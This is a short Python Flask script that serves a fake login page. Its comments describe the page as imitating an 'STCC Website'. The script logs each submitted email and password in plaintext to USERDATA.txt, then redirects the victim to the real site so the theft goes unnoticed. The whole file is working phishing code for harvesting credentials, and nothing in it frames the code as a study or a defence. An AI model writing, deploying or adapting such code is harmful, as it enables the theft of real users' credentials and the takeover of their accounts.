from flask import Flask
from flask import request
from flask import render_template
import time


app = Flask(__name__)

@app.route('/', methods=['GET', 'POST'])
def my_form():

    if request.method == 'POST':
        email = request.form.get('email')
        password = request.form.get('password')

        with open("USERDATA.txt", "a") as file:
            file.write(email+'\n')
            file.write(password+'\n')

        if email == '':
            return render_template("login.html") #If user doesnt input antything, refresh page
        else:
            return render_template('redirect.html', new=0, autoraise=True) # Sends user to html file that redirects to REAL 'STCC Website'



    return render_template("login.html") # When user enters URL load login.html (fake login page)


if __name__ == '__main__':
    app.run(host="192.168.1.69", port=5000, debug=True)
